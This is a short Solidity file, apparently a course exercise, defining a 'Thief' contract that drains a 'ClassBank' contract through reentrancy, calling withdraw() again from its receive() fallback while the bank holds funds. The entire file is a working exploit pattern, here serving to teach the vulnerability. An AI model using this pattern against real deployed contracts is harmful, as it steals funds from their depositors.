// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.2 <0.9.0;

import "./L14_1_ClassBank.sol";

contract Thief {
    ClassBank bank;

    constructor(address bankAddress) {
        bank = ClassBank(bankAddress);
    }

    function attack() public payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
}
